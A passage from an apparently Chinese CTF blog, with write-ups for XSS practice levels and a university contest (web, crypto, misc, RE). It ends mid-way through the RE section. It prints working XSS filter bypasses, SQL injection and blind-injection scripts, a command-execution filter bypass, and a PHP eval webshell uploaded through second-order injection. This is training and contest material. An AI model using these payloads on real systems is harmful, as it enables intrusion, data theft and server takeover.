XSS-4\n\n我们可以先fuzz一下，输入`<script>'\"`，然后查看源代码可知\n\n![](https://ww1.yunjiexi.club/2019/03/01/DNhiB.png)\n\n可以看到题目将左右尖括号置换为空，但是单双引号都还可以用，本题是用双引号闭合的，所以只需要把第三关的稍微改一下即可\n\n```\nhttp://localhost/xss20/level4.php?keyword=\" onclick=\"window.alert()\"\n```\n\n# XSS-5\n\n想上一关测试一下`<script>'\"`，发现scirpt被转成了scr_ipt，我们可以尝试上关的payload闭合双引号，但是发现onclick被置换成了o_nclick，换个思路，第二题中由于题目没有过滤`<>`，我们可以另行构造一个标签，在本题中也没有单独过滤这两个符号，所以可以用类似第二关的方式绕过\n```\nhttp://localhost/xss20/level5.php?keyword=\"><a href=javascript:alert(19)>\n```\n\n查看源代码可知题目采用黑名单过滤了`<script`和`on`两个敏感词\n\n# XSS-6\n\n测试`<script>'\"on`，发现还是基本和上关的过滤一样，`<input name=keyword  value=\"<scr_ipt>'\"o_n\">`，用上题payload故技重施，发现并没有那么简单，`href`被置换成了`hr_ef`，继续测试`data,action,formaction`，继续测试可以发现很多都被过滤了，走投无路之下大小写绕过试了一下居然就过了，可我记得上道题是大小写不敏感的呀...\n```\nhttp://localhost/xss20/level6.php?keyword=\"><a Href=javascript:alert(19)>\n```\n\n# XSS-7\n\n继续测试`<script>'\"on`->`<>'\"on`，猜测可能是将script置换为空字符，尝试双写绕过`<scscriptript>`，成功！对于其他敏感词如`on`等也可以用双写绕过，之前都是将敏感字符加下划线，本题是转化为空字符串\n```\nhttp://localhost/xss20/level7.php?keyword=\" oonnclick=\"window.alert()\n```\n\n# XSS-8\n\n测试`script><'\"`\n\n![](https://ws1.sinaimg.cn/large/0072Lfvtly1g0ndyh1byuj30np08mab6.jpg)\n\n可以看到对于a标签来说只过滤了双引号，还有将`script`替换成了`scr_ipt`，由于过滤了双引号，所以我们之前的闭合双引号构造其它标签的方法就不行了，只能在`href=\"\"`上面做文章，本来我们可以提交`javascript:alert()`，但是题目污染了script敏感词，不过我们可以使用html实体编码绕过（即&#开头的编码方式）\n```\nhttp://localhost/xss20/level8.php?keyword=java&#115;cript:alert('xss')\n```\n\n```php\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\n```\n\n查看后台代码可知题目果然就是直接将敏感词转换，所以确实存在编码绕过的问题的\n\n--------------------\n\n# 浏览器解码方式与XSS\n\n在上一关中，我们利用html实体编码实现了弹窗， 想要探究这些问题的原理，我们就必须去了解一下浏览器究竟是怎么解码的\n\n![](https://ws1.sinaimg.cn/large/0072Lfvtly1g0obpka93uj30gu09tdgm.jpg)\n\n浏览器在解析时，首先由浏览器解析HTML生成DOM树，然后解析CSS生成CSSDOM树，之后JS解释器才开始进行解析执行， 如果碰到URL的话会由URL解释器进行解码，为了我们研究问题，我们可以粗略的把浏览器分为三部分HTML解释器，URL解释器，JS解释器，顺序简化为`HTML->URL->JS`\n各种解释器能够识别的编码方式\n- HTML解释器识别的是HTML实体编码，也就是&#xx这种的\n- URL解释器可以识别URL编码\n- JS解释器可以识别Unicode编码，类似\\uxxx\n\n>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。\n这段话说的比较清楚了，在dom树构建之时，html实体编码是没有被自解码的，那么此时dom树的节点结构就已经被固定了。后续自解码以后并不会影响到dom树/节点/标签的结构。这个道理和sql中的预编译是有些类似的。之后的自解码以后获得的<>将不会被解析成新的节点。 但并不是说dom树构建完毕后就不能被改变了。js是可以操作节点进行增删改操作的。\n\n我们来探讨一下下面四个写法是否能够成功执行JS\n\n1. `<a href=javascript:al\\u65rt(1)>click</a>`\n2. `<a href=javascript:al%65rt(1)>click</a>`\n3. `<a href=javascript:al&#101;rt(1)>click</a>`\n4. `<a href=jav%61script:alert(1)>click4</a>`\n\n第一种写法无法实现弹窗，因为HTML和url都无法识别unicode编码，只有JS可以解码，但是在JS解释之前alert的e是被编码的状态，JS不会认为该语句是可以执行的，因为有一个被编码的字符e，如果此时修改为`alert('\\u65')`就可以被成功执行\n\n第二种写法可以实现弹窗，因为url解码是在js解码之前的，所以在JS执行之前已经得到完整的JS代码了，所以可以执行\n\n第三种写法自然也可以实现弹窗，因为HMLT解码更早，在url解码之前，所以自然能够执行\n\n第四种写法无法执行，因为在url识别阶段，解码得到的javascript，此时自然不会将JavaScript看做是伪协议，所以跳转链接会产生错误，可以与第二种写法进行比对\n\n>回到第8题，我们也就可以理解了，如果我们将`javacript`全部进行html实体编码，显然也是可以执行成功的，但是进行url编码则无法成功，与上面第4个例子的原理是一样的\n\n---------------------\n\n# XSS-9\n\n测试可知依然存在上述的编码绕过问题，但是本题加入了一个链接检测，如果链接不合法就会被拦截，经过测试发现只要链接中出现`http://`就会被判定为合法链接，之后我们再用注释将这段字符注释掉即可\n\n```\nhttp://localhost/xss20/level9.php?keyword=java&#115cript:alert()/*http://*/\n```\n\n查看代码可以看到过滤果然就是我们猜测的内容\n```php\nif(false===strpos($str7,'http://'))\n```\n\n# XSS-10\n\n本题主要考察隐藏元素的寻找，因为本题不在是前面题目用keyword的内容来替代，查看源代码可知有一个新表单存在三个参数，因为类型是`hidden`所以看不到，测试发现第三个参数是有效参数，而且只过滤了`<>`两个符号，所以我们用之前的payload即可，在设置`type=text`使其可见\n\n```\nhttp://localhost/xss20/level10.php?keyword=aaa&t_link=addd&t_history=ffads&t_sort=\" onclick=\"window.alert()\" type=\"text\n```\n\n# XSS-11\n\n题目中的t_sort字段过滤比较严格，无法绕过，但是题目在访问的时候消息头中会存在`Referer`字段，该字段存在注入的问题\n\n![](http://ws1.sinaimg.cn/large/0072Lfvtly1g0nintgmmpj30it04jjrs.jpg)\n\n![](http://ws1.sinaimg.cn/large/0072Lfvtly1g0niotgawjj30op04vq3g.jpg)\n\n测试`<>script'\"`，发现`<>`被过滤了，其余正常，所以payload就很简单了，和前面一样，只是位置变了而已\n\n![](http://ws1.sinaimg.cn/large/0072Lfvtly1g0niuqccozj30m105maae.jpg)\n\n# XSS-12\n\n和上体基本一样，只不过本题是UA头的xss\n\n```\n\" onclick=\"window.alert()\" type=\"text\n```\n\n# XSS-13\n\ncookie的xss\n\n```\nuser=\" onclick=\"window.alert()\" type=\"text;\n```\n\n# XSS-14\n\n这关环境有问题，网站访问不了，好像是一个图片型xss\n\n# XSS-15\n\nng-include 题目好像有点问题\n\n# XSS-16\n\n本题过滤的挺多的，过滤了`script`、`空格`、`/`，只要没过滤尖括号就万事好说，空格我们可以用`%0a`绕过，payload\n```\nhttp://localhost/xss20/level16.php?keyword=<input%0Aonclick=\"window.alert()\">\nhttp://localhost/xss20/level16.php?keyword=<image%0Asrc=1%0aonerror=\"alert()\">\n```\n\n# XSS-17\n\n本题有两个参数arg01和arg02，虽然还有flash，但是这道题和flash没关系，别被迷惑，测试一下输出点在哪个参数，发现arg02上有输出，`<>`、`\"`被过滤，我们可以使用onclick参数\n\n```\nhttp://localhost/xss20/level17.php?arg01=ffff&arg02=fff%208888%20onclick=alert()\n```\n\n# XSS-18\n\n过滤了`<>` `\"`，感觉和17题没什么区别\n\n```\nhttp://localhost/xss20/level18.php?arg01=wwww&arg02=bfff%20888%20onfocus=alert()\nhttp://localhost/xss20/level18.php?arg01=wwww&arg02=bfff%20888%20onclick=alert()\n```\n\n可能我太菜了，没get到17、18两题的考点，希望看到的师傅们和我交流一下XD\n\n# XSS-19\n\n从这关开始之后就是flash xss了，看了代码也看不懂2333，测试了一下这个payload是可以用的，\n\n```\nhttp://localhost/xss20/level19.php?arg01=version&arg02=%3Ca%20href=%22javascript:alert(document.domain)%22%3Exss_by_SST%3C/a%3E\n```\n\n# XSS-20\n\npayload看不懂\n\n```\nhttp://localhost/xss20/level20.php?arg01=id&arg02=\\%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height\n```\n\n有时间再研究吧，这个用的另一种脚本语言\n\n# 总结\n\n对于XSS的绕过，可以采用双写，大小写，闭合标签，利用过滤不完全的漏洞来使用标签\n\n>XSS一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie\n\n总的来说，对于XSS攻击，我们要对**输入参数进行过滤，对输出进行编码转义，白名单和黑名单相结合。**\n\n\n***reference:***\n[https://www.cnblogs.com/escape-w/p/10162831.html](https://www.cnblogs.com/escape-w/p/10162831.html)\n[https://blog.csdn.net/he_and/article/details/80588409](https://blog.csdn.net/he_and/article/details/80588409)\n","tags":["XSS"],"categories":["writeup"]},{"title":"CUMTCTF第二轮月赛","url":"/2019/01/30/cumtctf2/","content":"\n\n# 前言\n\n本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。\n\n<!-- more -->\n\n# web\n\n\n## 签到题\n\n```php\n<?php \n$white_list = range(0,9); \nrequire_once('flag.php'); \nif(isset($_REQUEST['0ver']) && isset($_REQUEST['0ver1']) && isset($_REQUEST['0ver2'])){ \n    $a = $_REQUEST['0ver']; \n    $b = $_REQUEST['0ver1']; \n    $c = $_REQUEST['0ver2']; \n    if(@ereg(\"^[0-9]+$\", $a) === FALSE){ \n        echo 'no must be number'; \n    }else{ \n        if(in_array($a,$white_list)){ \n            if(strlen($a)>1){ \n                if(md5($c) === md5($b) && ($b !== $c)){ \n                    echo \"<img src='dark.png'><br>\"; \n                    echo 'you are a great dark phper<br>'; \n                    echo $flag; \n                } \n                else{ \n                    echo \"you can do it!!!\"; \n                } \n                 \n            }else{ \n                echo 'you no dark'; \n            } \n        }else{ \n            echo 'you are so dark'; \n        } \n    }     \n}else \n    highlight_file(__FILE__); \n```\n\n很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 `03`类似的即可绕过，也可以使用`%00`截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可\n\npaylaod：\n\n```\ncurl -v http://202.119.201.199:32790?0ver=02 --data \"0ver1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&0ver2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\"\n```\n\n```\nflag:flag{73100259ca8919f402846b00d3b939a9}\n```\n\n## SimpleUpload\n\n查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。\n\n这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。\n\n![](https://i.imgur.com/kDxBrxT.png)    \n\n## 小型线上赌场\n\n题目提示了断电，应该是vi文件泄露，测试发现 `.index.swp`存在泄露，vim恢复一下\n\n```\nvi -r index.swp\n```\n\n代码如下\n\n```php\n<?php\n    $invest = $_GET['invest'];\n    $rand = rand(2,50);\n    $len = strlen(trim($_GET['invest']));\n    foreach ($_GET as $key => $value) {\n        if(!is_numeric($value)||$value == '0'){\n            die('no no no!');\n        }\n    }\n    $money = number_format($invest*$rand);\n    $money = intval(str_replace(',','',$money));\n    $guess = intval($_GET['guess']);\n    if ($guess == $money && strlen($money)===$len) {\n        echo $flag;\n}\n```\n\n代码思路是提交invest值，然后乘以一个2\\-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag\n\n![抓包爆破](https://i.loli.net/2019/01/24/5c49424c2fdc8.png)\n\n![flag](https://i.loli.net/2019/01/24/5c4942d3766a8.png)\n\n```\nflag{7e1e2bfe75c980be35c61ed1bde7a6f2}\n```\n\n## SimpleSQLi\n\n```\npython sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 --dbs\n```\n\n数据库名为security\n\n```\npython sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security --tables\n```\n\n表名flagishere\n\n```\npython sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security -T flagishere --columns --threads=10\n```\n\n列名id,flag\n\n```\npython sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security -T flagishere -C \"id,flag\" --dump --threads=10\n```\n\n```\nflag{4ur0Ra_SimPlE_sQLi_23333}\n```\n\n## 真的简单。。\n\n随手fuzz一下\n\n```\nhttp://202.119.201.199:32793/list.php?id=1%27\n```\n\n报错\n\n```\nhttp://202.119.201.199:32793/list.php?id=1%27--+\n```\n\n可以正常返回，猜测是单引号注入\n\n```\nhttp://202.119.201.199:32793/list.php?id=-1%27%20or%201=1--+\n```\n\n无正确回显，猜测可能是or有问题，换 `||` 试一下\n\n```\nhttp://202.119.201.199:32793/list.php?id=-2%27 || 3=length(database())--+\n```\n\n果然返回正确，数据库长度为3\n\n题目过滤了or，但是可以绕过\n\n```\nhttp://202.119.201.199:32793/list.php?id=-1%27%20oorr%201=1--+\n```\n\n爆列数\n\n```\nhttp://202.119.201.199:32793/list.php?id=-2%27 || 3=3 oorrder by 3--+\n```\n\n共有三列\n\n```\nhttp://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,database(),3--+\n```\n\ndatabase:ctf\n\n接下来就是常规的注入了\n\n```\nhttp://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()--+\n```\n\ntable：ctf,flag \n\n```\nhttp://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database()--+\n```\n\n列名：id,flag \n\n```\nhttp://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,flag,3 from flag--+\n```\n\n居然还有题目..\n\n> flag in admin_08163314/exec.php \n\n访问一下，是个命令执行界面，过滤了空格，可用`$IFS`绕过，尝试列根目录但是失败了，猜测可能是`/`被过滤了，但是 `* .`没有被过滤，可以用来读文件exec.php\n\n![](https://i.loli.net/2019/01/26/5c4c5df37356a.png)\n\n可以得到源码\n\n```php\n<?php\nfunction waf_exec($str){\n\t$black_str = \"/(;|&|>|}|{|%|#|!|\\?|@|\\+|\\/| )/i\";\n\t$str = preg_replace($black_str, \"\",$str);\n\treturn $str;\n}\n\nif (@$_POST['cmd']) {\n\t$cmd = waf_exec($_POST['cmd']);\n\tsystem($cmd);\n}\t\n```\n\n知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录\n\n![](https://i.loli.net/2019/01/26/5c4c5e68be087.png)\n\n![](https://i.loli.net/2019/01/26/5c4c5e99549bc.png)\n\n注意这里的flag_3314是个目录，还得继续列目录\n\n![](https://i.loli.net/2019/01/26/5c4c5eea0c492.png)\n\n![](https://i.loli.net/2019/01/26/5c4c5f1453698.png)\n\n![](https://i.loli.net/2019/01/26/5c4c5f7396879.png)\n\n![](https://i.loli.net/2019/01/26/5c4c5f7398de3.png)\n\n```\nflag{3570d4d9c72a19c889140674827eeca5}\n```\n\n## SimpleSQLi2\n\nfuzz测试了一下感觉是数字型注入\n\n```\nhttp://bxs.cumt.edu.cn:30010/test/index.php?id=-1%20||%201=1\n```\n\n接下来测试过滤规则\n\n```\nhttp://bxs.cumt.edu.cn:30010/test/index.php?id=2>2 || length('seleselectct')=6\n```\n\n测试发现过滤了 `select,or,空格`，空格可用`/**/`绕过，select等可双写绕过，接下来只需要编写盲注脚本即可\n\n```python\nimport requests\n\nwords = \"2019~\"\nurl = \"http://bxs.cumt.edu.cn:30010/test/index.php?id=\"\ntable = \"\"\n\n# payload = \"2>2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),{},1))={}\"\n# emails,flagishere,referers,uagents,users\n\n# payload = \"2>2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),{},1))={}\"\n# Id,flag\n\npayload = \"2>2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),{},1))={}\"\n\nfor j in range(1,60):\n\tfor i in range(34,128):\n\t\tres = requests.get(url+payload.format(j,i)).text\n\t\tif words in res:\n\t\t\ttable += chr(i)\n\t\t\tprint(table)\n\t\t\tbreak\n```\n\n可以得到flag如下\n\n```\nflag{4nother_SimPLE_SQLi_0rek1}\n```\n\n后来和出题人交流了一下，思路非预期2333~\n\n## 文件管理系统\n\n网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个`xxxx.jpg`，然后修改文件名，通过修改文件名为 `xxxx.php%00.jpg` 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码`www.zip`\n\n核心代码如下\n\nupload.php\n\n```php\nrequire_once \"common.inc.php\";\ndefine('ROOT',dirname(__FILE__).'/'); \nif($_FILES)\n{\n    $file = $_FILES[\"upfile\"];\n    if($file[\"error\"] == UPLOAD_ERR_OK) {\n        $name = basename($file[\"name\"]);\n        $path_parts = pathinfo($name);\n        if(!in_array($path_parts[\"extension\"], array(\"gif\", \"jpg\", \"png\", \"zip\", \"txt\"))) {\n            exit(\"error extension\");\n        }\n        $path_parts[\"extension\"] = \".\" . $path_parts[\"extension\"];\n        $name = $path_parts[\"filename\"] . $path_parts[\"extension\"];       \n        $path_parts['filename'] = addslashes($path_parts['filename']);\n        $sql = \"select * from `file` where `filename`='{$path_parts['filename']}' and `extension`='{$path_parts['extension']}'\";\n        $fetch = $db->query($sql);\n        if($fetch->num_rows>0) {\n            exit(\"file is exists\");\n        }\n        //echo $file[\"tmp_name\"], ROOT . UPLOAD_DIR . $name;\n        if(move_uploaded_file($file[\"tmp_name\"], ROOT . UPLOAD_DIR . $name)) {\n\n            $sql = \"insert into `file` ( `filename`, `view`, `extension`) values( '{$path_parts['filename']}', 0, '{$path_parts['extension']}')\";\n            $re = $db->query($sql);\n            if(!$re) {\n                echo 'error';\n                print_r($db->error);\n                exit;\n            }\n            $url = \"/\" . UPLOAD_DIR . $name;\n            echo \"Your file is upload, url:\n                <a href=\\\"{$url}\\\" target='_blank'>{$url}</a><br/>\n                <a href=\\\"/\\\">go back</a>\";\n        } else {\n            exit(\"upload error\");\n        }\n    } else {\n        print_r(error_get_last());\n        exit;\n    }\n}\n``` \n\nrename.php\n\n```php\nrequire_once \"common.inc.php\";\ndefine('ROOT',dirname(__FILE__).'/'); \nif(isset($req['oldname']) && isset($req['newname'])) {\n    $result = $db->query(\"select * from `file` where `filename`='{$req['oldname']}'\");\n    if ($result->num_rows>0) {\n        $result = $result->fetch_assoc();\n    }else{\n        exit(\"old file doesn't exists!\");\n    }\n    if($result) {\n        $req['newname'] = basename($req['newname']);\n        $re = $db->query(\"update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}\");\n        if(!$re) {\n            print_r($db->errorInfo());\n            exit;\n        }\n        $oldname = ROOT.UPLOAD_DIR . $result[\"filename\"].$result[\"extension\"];\n        $newname = ROOT.UPLOAD_DIR . $req[\"newname\"].$result[\"extension\"];\n        if(file_exists($oldname)) {\n            rename($oldname, $newname);\n            $url = \"/\" . $newname;\n            echo \"Your file is rename, url:\n                <a href=\\\"{$url}\\\" target='_blank'>{$url}</a><br/>\n                <a href=\\\"/\\\">go back</a>\";\n        }\n        else{echo $oldname.\" not exists.\";}\n    }\n}\n?>\n```\n\n由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 [http://drops.xmd5.com/static/drops/tips-10564.html](http://drops.xmd5.com/static/drops/tips-10564.html)，而且还给出了攻击流程，本题是个二次注入。\n\n题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下\n\n1.  选择一个文件上传，命名为 `',extension='',filename='snow.jpg.jpg`，此时执行的sql语句是<code>insert into `file` ( `filename`, `view`, `extension`) values( '{$path_parts['filename']}', 0, '{$path_parts['extension']}')</code>，此时的数据库中`filename-->',extension='',filename='snow.jpg`，`extension-->jpg`\n\n2. 利用update更新是的后缀名为空，*old name:*  `',extension='',filename='snow.jpg`;*new name:* `snow.jpg`，此时执行的sql命令变成\n<code>update `file` set `filename`='snow.jpg',`oldname`='',extension='',filename='snow.jpg.jpg' where `fid`={$result['fid']};</code> ，这样的话数据库中就有文件名为 `snow.jpg`，后缀名为空的记录，但是实际的文件名却是`snow.jpg.jpg`\n\n3. 上传真正包含shell的文件`<?php @eval($_POST['snow']);?>` ，命名为`snow.jpg`，数据库中的记录是文件名为snow，扩展名为jpg，\n\n4. 使用rename重命名 *old name:* `snow.jpg`，*new name:* `snow.php`，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为`snow.php`，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。\n\n![](https://i.loli.net/2019/01/27/5c4d642c02f24.png)\n\n![](https://i.loli.net/2019/01/27/5c4d642bedc54.png)\n\n```\nflag{f34f8aa6cd362582dd1ae5f975c7b20f}\n```\n\n# crypto\n\n## 现代密码签到\n\n利用在线des解密，密钥为空。\n解密后发现\n`U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==`\n是base64编码，将所得结果再次解密得到flag\n![](https://i.imgur.com/jPfKQ85.png)\n\n## 古典密码签到\n\n看到字符串带`=`，猜测是base系列编码，解密发现是base32编码 ^pho^oav\\`\\ntZnj\\`\\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文\n\n```python\ns = \"xxxxxxxxxxxxx\"\nflag = \"\"\nfor i in s:\n\tflag += chr(ord(i)+5)\nprint(flag)\n``` \n\n```\ncumtctf{easy_soeasy___hhh}\n```\n\n## easyrsa\n\n本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制\n\n```python\n# coding=utf-8\nimport gmpy2\ne = 5\n# 读入 n, 密文\nn = int('36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5',12)\nc = int('411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065',12)\nm, b = gmpy2.iroot(c, e)\nprint hex(m)[2:].decode('hex')\n```\n\nflag如下：\n```\ncumtctf{12_jinzhi_rsa}\n```\n\n## playfir\n\n题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下\n\n```python\n# playfair\nimport string\nimport itertools\n\n# 返回该字符的行号和列号\ndef get_row_col(word,pass_table):\n\tli = pass_table.index(word)\n\tli_r = li // 5\n\tli_c = li % 5\n\treturn (li_r,li_c)\n\n# 输入两个元素的坐标，得到解密对应的两个元素\ndef get_dou_word(r1,c1,r2,c2):\n\tif r1 == r2:\n\t\tc1 = (c1-1) % 5\n\t\tc2 = (c2-1) % 5\n\t\treturn [(r1,c1),(r2,c2)]\n\telif c1 == c2:\n\t\tr1 = (r1-1) % 5 \n\t\tr2 = (r2-1) % 5\n\t\treturn [(r1,c1),(r2,c2)]\n\telse:\n\t\treturn [(r1,c2),(r2,c1)]\n\n# 解密函数\ndef decrypt(cip,keyword):\n\t# global pass_table\n\talpha = list(string.ascii_uppercase)\n\talpha.remove('J')\n\tfor i in keyword:\n\t\tif i == \"J\":\n\t\t\tcontinue \n\t\talpha.remove(i)\n\tpass_table = list(keyword) + alpha\n\tplain = \"\"\n\tfor i in range(len(cip)//2):\n\t\tgrp = cip[i*2:i*2+2]\n\t\tr1,c1 = get_row_col(grp[0],pass_table)\n\t\tr2,c2 = get_row_col(grp[1],pass_table)\n\t\ttemp = get_dou_word(r1,c1,r2,c2)\n\t\tp1 = temp[0][0]*5 + temp[0][1]\n\t\tp2 = temp[1][0]*5 + temp[1][1]\n\t\tplain += pass_table[p1] + pass_table[p2]\n\treturn plain\n\nfor sss in itertools.permutations(string.ascii_uppercase,4):\n\tnow_key = \"\".join(sss)\n\tcip1 = \"DMBCCVTLMNKQ\"\n\tcip2 = \"LRBECXPTCPHU\"\n\tt1 = decrypt(cip1,now_key)\n\tt2 = decrypt(cip2,now_key)\n\tif \"FLAGA\" in t1:\n\t\tprint(t1)\n\t\tcontinue\n\telif \"FLAGB\" in t2:\n\t\tprint(t2)\n\t\tcontinue\n```\n\n可以得到爆破出来符合条件的明文，找出语义正确的即可\n\n> flagaplayfirflagbyoudoit\n\n求出md5值即可\n\n```\nflag{355c1fb44b58ad7c38d88b5ba4f095b0}\n```\n\n# MISC\n\n## misc签到\n\n解压之后给出了5个图片文件:\n\n![](https://i.loli.net/2019/01/29/5c4fc4c6822ca.png)\n\n文件夹名是braille，想到了盲文，搜索盲文对照表\n\n![](https://i.loli.net/2019/01/29/5c4fc69264c59.png)\n\n根据解压文件夹的提示可以对照出flag是B1ind。\n\n## base全家桶了解一下??\n\n应该就是base编码的转换，尝试一下不同的base编码即可\n\n第一层base64\n\n```\nGY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E\n```\n\n第二层base32\n\n```\n666C61677B57656C63306D655F7430305F63756D746374667D\n```\n\n第三层base16\n\n```\nflag{Welc0me_t00_cumtctf}\n```\n\n## BXS图标真好看\n\n记事本打开发现是一个二进制文件，file命令查看一下文件类型\n\n> BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced\n\n修改后缀为png，看到一串文字`fgoo kwnl{_u n_gaDy_ 0p}`，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏\n\n![](https://i.loli.net/2019/01/25/5c4a720c0a5e5.png)\n\n```\nflag{Do_you_kn0w_png}\n```\n\n## 矿大校歌认真听听吧？\n\n下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到`cumtctf2019`，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了[https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#\\_2](https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2)，运行尝试一下\n\n```\nDecode.exe -X -P cumtctf2019 cumt.mp3\n```\n\n```\nflag{cumtctf_1s_v3ry_g00d!}\n```\n\n## 起床改error啦！\n\nbinwalk查看图片发现存在zip压缩包，提取一下\n\n```\nbinwalk 2333.png\nforemost 2333.png\n```\n\n解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag\n\n![](https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png)\n\n# RE\n\n## 逆向签到\n\n直接丢进IDA查看，查看伪代码：\n\n![](https://i.loli.net/2019/01/28/5c4f1b9f3be88.png)\n\n可以看到这些变量占用了4个字节来存储。\n\n![](https://i.loli.net/2019/01/28/5c4f1ade58965.png)\n\n这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。\n\n![](https://i.loli.net/2019/01/28/5c4f1c7412770.png)\n\n查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。\n\n```python\n#coding:utf-8\nv5 = [53,63,50,52,40,1,50,61,55,99,62,118,98,60,60,12,106,58,37,54,12,38,12,102,48,60,33,54,46]\n\nfor i in range(0,100):\n    res = \"\"\n    for j in range(0,29):\n        res += chr(v5[j]^i)\n    print res\n```\n\n运行结果：\n\n![](https://i.loli.net/2019/01/28/5c4f1a3be6535.png)\n\n## 